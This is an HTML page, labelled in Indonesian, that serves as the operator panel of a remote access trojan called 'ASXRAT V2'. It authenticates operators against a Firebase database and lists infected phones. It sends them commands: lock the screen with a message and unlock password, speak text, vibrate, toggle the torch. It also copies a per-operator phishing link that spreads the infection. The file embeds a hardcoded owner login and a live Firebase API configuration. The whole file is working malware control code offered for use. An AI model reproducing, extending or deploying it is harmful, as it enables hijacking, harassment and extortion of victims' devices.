<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>ASXRAT V2 | MASTER PANEL</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style>
        :root { --red: #ff0000; --bg: #000000; --card: #111111; }
        body { background: var(--bg); color: #fff; font-family: 'Courier New', monospace; margin: 0; padding: 0; }
        
        #auth { position: fixed; inset: 0; background: var(--bg); z-index: 999; display: flex; flex-direction: column; justify-content: center; align-items: center; padding: 15px; }
        
        /* BANNER FULL MELINTANG - ANTI KOTAK KECIL */
        .banner-container { width: 100%; max-width: 400px; position: relative; }
        .banner-img { 
            width: 100%; height: 160px; object-fit: cover; 
            border: 2px solid var(--red); border-bottom: none; 
            border-radius: 15px 15px 0 0; box-shadow: 0 0 25px rgba(255, 0, 0, 0.6); 
            display: block; background: #222; /* Warna cadangan kalo loading */
        }

        .login-card { 
            background: var(--card); padding: 25px; border: 2px solid var(--red); 
            border-radius: 0 0 15px 15px; width: 100%; max-width: 400px; 
            text-align: center; box-shadow: 0 10px 30px rgba(255, 0, 0, 0.4); 
            margin-top: -2px; box-sizing: border-box; 
        }
        
        input { width: 100%; padding: 12px; margin: 8px 0; background: #000; border: 1px solid #333; color: var(--red); border-radius: 8px; text-align: center; outline: none; font-weight: bold; box-sizing: border-box; }
        .btn-main { background: var(--red); color: #fff; border: none; padding: 15px; font-weight: bold; border-radius: 8px; width: 100%; cursor: pointer; text-transform: uppercase; margin-top: 10px; box-shadow: 0 0 15px rgba(255, 0, 0, 0.5); }
        
        /* DASHBOARD AREA */
        #dash { display: none; padding: 20px; max-width: 500px; margin: auto; }
        .target-card { background: var(--card); border: 1px solid #222; padding: 15px; margin-bottom: 15px; border-radius: 12px; border-left: 5px solid var(--red); }
        .control-group { background: #000; padding: 10px; border-radius: 8px; border: 1px solid #222; margin-top: 10px; }
        .btn-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 8px; margin-top: 10px; }
        .btn-rat { background: #000; color: #fff; border: 1px solid var(--red); padding: 10px; font-size: 11px; border-radius: 6px; cursor: pointer; font-weight: bold; }
    </style>
</head>
<body>

    <div id="auth">
        <div class="banner-container">
            <img src="https://drive.google.com/uc?export=view&id=1vBE16nPKAsIaaKAuUMYg6GgP6Ue28_k7" class="banner-img" onerror="this.src='https://via.placeholder.com/400x160/000000/ff0000?text=ASXRAT+V2'">
        </div>
        <div class="login-card">
            <div style="font-size:10px; color:#eee; margin-bottom:15px; letter-spacing:1px;">
                <span style="color:var(--red); font-weight: bold;">POWERED BY : ELVOXI</span><br>
                CONTACT TELEGRAM : @Elvoxi_Reals01😘
            </div>
            <input type="text" id="email-input" placeholder="EMAIL ADDRESS...">
            <input type="password" id="key-input" placeholder="SECRET KEY...">
            <button onclick="login()" class="btn-main">ACCESS PANEL</button>
        </div>
    </div>

    <div id="dash">
        <div style="padding:15px; border:1px solid var(--red); border-radius:10px; background:#050505; text-align:center; margin-bottom:20px;">
            <b id="user-display" style="color:var(--red); font-size:18px;">...</b><br>
            <button class="btn-main" onclick="salinLink()" style="background:#fff; color:#000; margin-top:15px;">📋 COPY MY LINK PHISING</button>
        </div>
        <div id="list"></div>
    </div>

<script>
    const linkPhising = "https://elvoxi.github.io/newcallingelvoxianjaikwkw/target.html";
    const firebaseConfig = {
      apiKey: "AIzaSyAddYZVOXibzxIWNTNwqqQn5n7QUrQN6ys",
      authDomain: "rat-html.firebaseapp.com",
      databaseURL: "https://rat-html-default-rtdb.asia-southeast1.firebasedatabase.app",
      projectId: "rat-html",
      storageBucket: "rat-html.firebasestorage.app",
      messagingSenderId: "1060124583265",
      appId: "1:1060124583265:web:a117830e798cd1d60f5120"
    };

    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();
    let currentKey = "";

    function login() {
        const mail = document.getElementById('email-input').value;
        const key = document.getElementById('key-input').value;
        if(mail === "elvoxi@gmail.com" && key === "elvoxi122") {
            currentKey = "elvoxi122";
            start();
        } else {
            db.ref('asxrat/accounts/' + key).once('value', (s) => {
                const data = s.val();
                if(s.exists() && data.email === mail) {
                    currentKey = key;
                    start();
                } else alert("DATA SALAH!");
            });
        }
    }

    function start() {
        document.getElementById('auth').style.display = 'none';
        document.getElementById('dash').style.display = 'block';
        document.getElementById('user-display').innerText = "OWNER: " + currentKey;

        db.ref('mario/targets').on('value', (snap) => {
            const list = document.getElementById('list');
            list.innerHTML = "";
            snap.forEach((child) => {
                const d = child.val();
                if(d.belongsTo === currentKey) {
                    list.innerHTML += `
                        <div class="target-card">
                            <b style="color:var(--red)">📱 ${d.model}</b>
                            <div class="control-group">
                                <input type="text" id="lock-msg-${child.key}" placeholder="Pesan Lock...">
                                <input type="text" id="lock-pw-${child.key}" placeholder="Set PW Unlock...">
                                <div class="btn-grid">
                                    <button class="btn-rat" onclick="sendLock('${child.key}')">🔒 LOCK</button>
                                    <button class="btn-rat" onclick="cmd('${child.key}', 'unlock')">🔓 UNLOCK</button>
                                </div>
                            </div>
                            <div class="control-group">
                                <input type="text" id="tts-${child.key}" placeholder="Ketik suara...">
                                <div class="btn-grid">
                                    <button class="btn-rat" onclick="sendTTS('${child.key}')">🗣️ SPEAK</button>
                                    <button class="btn-rat" onclick="cmd('${child.key}', 'vibrate')">📳 GETAR</button>
                                    <button class="btn-rat" onclick="cmd('${child.key}', 'torch_on')">🔦 SENTER</button>
                                    <button class="btn-rat" onclick="db.ref('mario/targets/${child.key}').remove()">🗑️ HAPUS</button>
                                </div>
                            </div>
                        </div>`;
                }
            });
        });
    }

    function cmd(id, act) { db.ref('mario/commands/' + id).set({ action: act, time: Date.now() }); }
    function sendLock(id) {
        const msg = document.getElementById('lock-msg-' + id).value || "LOCKED!";
        const pw = document.getElementById('lock-pw-' + id).value || "123";
        db.ref('mario/commands/' + id).set({ action: 'lock_screen', text: msg, pass: pw, time: Date.now() });
    }
    function sendTTS(id) {
        const txt = document.getElementById('tts-' + id).value;
        if(!txt) return;
        db.ref('mario/commands/' + id).set({ action: 'speak_text', text: txt, time: Date.now() });
    }
    function salinLink() {
        const encoded = btoa(currentKey);
        navigator.clipboard.writeText(linkPhising + "?id=" + encoded);
        alert("LINK DISALIN!");
    }
</script>
</body>
</html>
